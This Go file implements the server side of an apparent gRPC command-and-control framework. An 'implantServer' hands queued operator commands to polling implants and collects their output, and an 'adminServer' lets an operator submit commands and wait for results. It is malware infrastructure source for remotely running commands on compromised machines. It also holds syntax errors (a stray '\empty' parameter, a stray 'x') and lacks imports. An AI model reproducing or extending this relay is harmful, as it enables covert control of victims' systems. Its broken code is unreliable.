package server

type implantServer struct {    
  work, output chan *grpcapi.Command
}

type adminServer struct {    
  work, output chan *grpcapi.Command
}

func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {    
  s := new(implantServer)    
  s.work = work    
  s.output = output    
  return s
}

func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {    
  s := new(adminServer)    
  s.work = work    
  s.output = output    
  return s
}

func (s *implantServer) FetchCommand(ctx context.Context, \empty *grpcapi.Empty) (*grpcapi.Command, error) {    
  var cmd = new(grpcapi.Command)x 
  select {    
  case cmd, ok := <-s.work:        
    if ok {            
      return cmd, nil        
    }        
    return cmd, errors.New("channel closed")     
  default:        
    // No work        
    return cmd, nil    
  }
}

func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {    
  s.output <- result    
  return &grpcapi.Empty{}, nil
}

func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {    
  var res *grpcapi.Command    
  go func() {        
    s.work <- cmd    
  }()    
  res = <-s.output    
  return res, nil
}